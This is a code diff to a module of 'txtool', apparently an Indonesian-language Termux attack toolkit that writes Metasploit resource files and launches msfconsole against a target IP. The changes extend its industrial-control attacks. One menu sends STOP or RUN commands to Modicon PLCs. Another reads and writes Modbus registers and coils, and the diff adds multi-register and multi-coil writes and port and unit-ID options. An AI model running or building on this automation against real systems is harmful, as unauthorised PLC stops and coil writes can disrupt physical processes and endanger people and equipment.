@@ -4,24 +4,36 @@
 import subprocess, sys, os, socket
 
 sys.path.append("/data/data/com.termux/files/usr/share/txtool/core")
-from fungsi import warna, empty, IP2, txtool_dir, finish_exploit, IP
+from fungsi import warna, IP2, txtool_dir, finish_exploit, IP
 from sub_menu import kembali
 import sub_menu3 as back
 
 path = "/data/data/com.termux/files/usr/share/txtool/core"
 
-if os.path.isfile("/data/data/com.termux/files/usr/bin/msfvenom"):
-    if os.path.isfile("/data/data/com.termux/files/usr/bin/msfconsole"):
-        metasploit_path = "/data/data/com.termux/files/usr/bin"
+if os.path.isfile("/data/data/com.termux/files/usr/bin/msfvenom") and os.path.isfile("/data/data/com.termux/files/usr/bin/msfconsole"):
+    metasploit_path = "/data/data/com.termux/files/usr/bin"
 
 elif os.path.isdir("/data/data/com.termux/files/home/metasploit-framework"):
     metasploit_path = "/data/data/com.termux/files/home/metasploit-framework"
 
-
 def start():
-    print(warna.hijau + "\n[*] " + warna.tutup + "fire up metasploit, please wait a moment...\n")
+    print(warna.hijau + "\n[*] " + warna.tutup + "fire up metasploit, please wait a moment...")
     subprocess.Popen("%s/msfconsole -q -r %s/payload.rc" %
                       (metasploit_path, txtool_dir), shell=True).wait()
+
+def canceled():
+    print(warna.merah + "\n[x] " + warna.tutup + " Wrong command. txtool will be assume exploitation has been canceled.")
+    raw_input("    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
+
+
+def empty():
+    try:
+        print(warna.kuning + "\n[!] " + warna.tutup + "Warning. your input is empty, txtool will be assume exploitation is canceled")
+        raw_input("\n    press <" + warna.hijau + "Enter" + warna.tutup + "> to continue  ")
+
+    except KeyError:
+        pass
+
 
 def menu1():
     alamat_ip = IP2()
@@ -109,7 +121,10 @@ def menu5():
         os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
         back.menu['menu_utama']()
 
-    else: return False
+    else:
+        canceled()
+        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
+        back.menu['menu_utama']()
 
 
 def menu6():
@@ -146,7 +161,10 @@ def menu6():
         os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
         back.menu['menu_utama']()
 
-    else: return False
+    else:
+        canceled()
+        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
+        back.menu['menu_utama']()
 
 
 def menu7():
@@ -195,7 +213,7 @@ def menu8():
         empty()
         back.menu['menu_utama']()
 
-    if command == '1':
+    if command == '1' or command == 'STOP' or command == 'stop':
         filewrite = open(txtool_dir + "/payload.rc", "w")
         filewrite.write("use auxiliary/admin/scada/modicon_command\nset RHOST %s\nset MODE STOP\nexploit\r\n\r\n" % (ip))
         filewrite.close()
@@ -204,7 +222,7 @@ def menu8():
         os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
         back.menu['menu_utama']()
 
-    if command == '2':
+    if command == '2' or command == 'RUN' or command == 'run':
         filewrite = open(txtool_dir + "/payload.rc", "w")
         filewrite.write("use auxiliary/admin/scada/modicon_command\nset RHOST %s\nset MODE RUN\nexploit\r\n\r\n" % (ip))
         filewrite.close()
@@ -213,8 +231,10 @@ def menu8():
         os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
         back.menu['menu_utama']()
 
-    else: return False
-
+    else:
+        canceled()
+        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
+        back.menu['menu_utama']()
 
 def menu9():
     IP()
@@ -303,19 +323,36 @@ def menu11():
         empty()
         back.menu['menu_utama']()
 
-    print(warna.kuning + "\n[!] " + warna.tutup + " Modbus data address")
+    print(warna.kuning + "\n[!] " + warna.tutup + " default port number is 502")
+    port = raw_input(warna.biru + "[+] " + warna.tutup + " set PORT" + warna.kuning + "  >>  " + warna.tutup)
+    if port == '':
+        port = '502'
+
+    print(warna.kuning + "\n[!] " + warna.tutup + " default modbus Unit ID is 1")
+    uid = raw_input(warna.biru + "[+] " + warna.tutup + " set UNIT_NUMBER" + warna.kuning + "  >>  " + warna.tutup)
+    if uid == '':
+        uid = '1'
+
+    print(warna.kuning + "\n[!] " + warna.tutup + " Modbus data address (must be numerical)")
     data_address = raw_input(warna.biru + "[+] " + warna.tutup + " set DATA_ADDRESS" + warna.kuning + "  >>  " + warna.tutup)
     if data_address == '':
         empty()
         back.menu['menu_utama']()
 
-    print(warna.hijau + "\n[*] " + warna.tutup + " ACTION : \n\t1 = READ_REGISTERS\n\t2 = READ_COILS\n\t3 = WRITE_REGISTER\n\t4 = WRITE_COIL")
-    print(warna.kuning + "\n[!] " + warna.tutup + " default action is 1")
+    print(warna.hijau + "\n[*] " + warna.tutup + " ACTION : \n\t1 = READ_REGISTERS (Read words from several registers)\n\t2 = READ_COILS (Read bits from several coils)\n\t3 = WRITE_REGISTER (Write one word to a register)\n\t4 = WRITE_COIL (Write one bit to a coil)\n\t5 = WRITE_REGISTERS (Write words to several registers)\n\t6 = WRITE_COILS (Write bits to several coils)")
     action = raw_input(warna.biru + "[+] " + warna.tutup + " Choose an action" + warna.kuning + "  >>  " + warna.tutup)
-    if action == '1' or action == '':
+    if action == '':
+        empty()
+        back.menu['menu_utama']()
+
+    if action == '1':
+        print(warna.kuning + "\n[!] " + warna.tutup + " Number of registers to read, default is 1")
+        number = raw_input(warna.biru + "[+] " + warna.tutup + " set NUMBER" + warna.kuning + "  >>  " + warna.tutup)
+        if number == '':
+            number = '1'
         filewrite = open(txtool_dir + "/payload.rc", "w")
-        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset DATA_ADDRESS %s\nset ACTION READ_REGISTERS\nexploit\r\n\r\n" %
-                        (ip, data_address))
+        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset RPORT %s\nset UNIT_NUMBER %s\nset DATA_ADDRESS %s\nset NUMBER %s\nset ACTION READ_REGISTERS\nexploit\r\n\r\n" %
+                        (ip, port, uid, data_address, number))
         filewrite.close()
         start()
         finish_exploit()
@@ -323,37 +360,86 @@ def menu11():
         back.menu['menu_utama']()
 
     if action == '2':
+        print(warna.kuning + "\n[!] " + warna.tutup + " Number of coils to read, default is 1")
+        number2 = raw_input(warna.biru + "[+] " + warna.tutup + " set NUMBER" + warna.kuning + "  >>  " + warna.tutup)
+        if number2 == '':
+            number2 = '1'
         filewrite = open(txtool_dir + "/payload.rc", "w")
-        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset DATA_ADDRESS %s\nset ACTION READ_COILS\nexploit\r\n\r\n" %
-                        (ip, data_address))
+        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset RPORT %s\nset UNIT_NUMBER %s\nset DATA_ADDRESS %s\nset NUMBER %s\nset ACTION READ_COILS\nexploit\r\n\r\n" %
+                        (ip, port, uid, data_address, number2))
         filewrite.close()
         start()
         finish_exploit()
         os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
         back.menu['menu_utama']()
 
-    elif action == '3':
-        print(warna.kuning + '\n[!] ' + warna.tutup + ' only 2 options "0 or 1", (de-activate or activate)')
+    if action == '3':
+        print(warna.kuning + '\n[!] ' + warna.tutup + ' Data to write (must be numerical)')
         data = raw_input(warna.biru + "[+] " + warna.tutup + "set DATA" + warna.kuning + "  >>  " + warna.tutup)
+        if data == '':
+            empty()
+            back.menu['menu_utama']()
+
         filewrite = open(txtool_dir + "/payload.rc", "w")
-        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset DATA_ADDRESS %s\nset DATA %s\nset ACTION WRITE_REGISTER\nexploit\r\n\r\n" %
-                        (ip, data_address, data))
+        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset RPORT %s\nset UNIT_NUMBER %s\nset DATA_ADDRESS %s\nset DATA %s\nset ACTION WRITE_REGISTER\nexploit\r\n\r\n" %
+                        (ip, port, uid, data_address, data))
         filewrite.close()
         start()
         finish_exploit()
         os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
         back.menu['menu_utama']()
 
-    elif action == '4':
-        print(warna.kuning + '\n[!] ' + warna.tutup + ' only 2 options "0 or 1", (de-activate or activate)')
-        data = raw_input(warna.biru + "[+] " + warna.tutup + " set DATA" + warna.kuning + "  >>  " + warna.tutup)
+    if action == '4':
+        print(warna.kuning + '\n[!] ' + warna.tutup + ' Data to write (must be numerical)')
+        data2 = raw_input(warna.biru + "[+] " + warna.tutup + " set DATA" + warna.kuning + "  >>  " + warna.tutup)
+        if data2 == '':
+            empty()
+            back.menu['menu_utama']()
+
         filewrite = open(txtool_dir + "/payload.rc", "w")
-        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset DATA_ADDRESS %s\nset DATA %s\nset ACTION WRITE_COIL\nexploit\r\n\r\n" %
-                        (ip, data_address, data))
+        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset RPORT %s\nset UNIT_NUMBER %s\nset DATA_ADDRESS %s\nset DATA %s\nset ACTION WRITE_COIL\nexploit\r\n\r\n" %
+                        (ip, port, uid, data_address, data2))
         filewrite.close()
         start()
         finish_exploit()
         os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
         back.menu['menu_utama']()
 
-    else: return False
+    if action == '5':
+        print(warna.kuning + '\n[!] ' + warna.tutup + ' Words to write to each register separated with a comma')
+        print(warna.kuning + '[!] ' + warna.tutup + ' Example : 1,2,3,4')
+        data_reg = raw_input(warna.biru + "[+] " + warna.tutup + " set DATA_REGISTERS" + warna.kuning + "  >>  " + warna.tutup)
+        if data_reg == '':
+            empty()
+            back.menu['menu_utama']()
+
+        filewrite = open(txtool_dir + "/payload.rc", "w")
+        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset RPORT %s\nset UNIT_NUMBER %s\nset DATA_ADDRESS %s\nset DATA_REGISTERS %s\nset ACTION WRITE_REGISTERS\nexploit\r\n\r\n" %
+                        (ip, port, uid, data_address, data_reg))
+        filewrite.close()
+        start()
+        finish_exploit()
+        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
+        back.menu['menu_utama']()
+
+    if action == '6':
+        print(warna.kuning + '\n[!] ' + warna.tutup + ' Data in binary to write')
+        print(warna.kuning + '[!] ' + warna.tutup + ' Example : 0110')
+        data_coil = raw_input(warna.biru + "[+] " + warna.tutup + " set DATA_COILS" + warna.kuning + "  >>  " + warna.tutup)
+        if data_coil == '':
+            empty()
+            back.menu['menu_utama']()
+
+        filewrite = open(txtool_dir + "/payload.rc", "w")
+        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset RPORT %s\nset UNIT_NUMBER %s\nset DATA_ADDRESS %s\nset DATA_COILS %s\nset ACTION WRITE_COILS\nexploit\r\n\r\n" %
+                        (ip, port, uid, data_address, data_coil))
+        filewrite.close()
+        start()
+        finish_exploit()
+        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
+        back.menu['menu_utama']()
+
+    else:
+        canceled()
+        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
+        back.menu['menu_utama']()
